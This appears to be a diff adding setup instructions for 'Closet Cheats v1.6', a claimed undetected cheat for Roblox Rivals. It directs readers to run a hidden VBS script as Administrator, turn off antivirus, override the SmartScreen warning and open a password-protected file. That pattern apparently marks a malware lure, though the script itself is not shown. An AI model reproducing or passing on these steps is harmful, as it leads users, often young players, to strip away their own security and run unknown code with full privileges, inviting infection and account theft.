@@ -1,0 +1,27 @@
+==============================
+Closet Cheats v1.6 - Instructions
+==============================
+
+🛠️ STATUS: UNDETECTED (as of July 2025)
+✅ Game Supported: Roblox Rivals ONLY
+
+-----------------------------------
+⚠️ SETUP GUIDE
+-----------------------------------
+
+1. Launch **Roblox Rivals**.
+2. Right-click on `Closet_Cheats.vbs` → **Run as Administrator**.
+3. Wait 5–10 seconds. You won't see any window — it's normal.
+4. Press **F7** in-game to activate the cheat menu.
+
+If nothing happens:
+- Disable antivirus temporarily (it may block script injection)
+- If Windows shows a SmartScreen warning:  
+  → Click **More Info** → **Run Anyway**
+
+💡 Pro Tip:
+Place the file in `C:\Temp` or Desktop for smoother injection.
+
+==============================
+Password: closetgod2025
+==============================
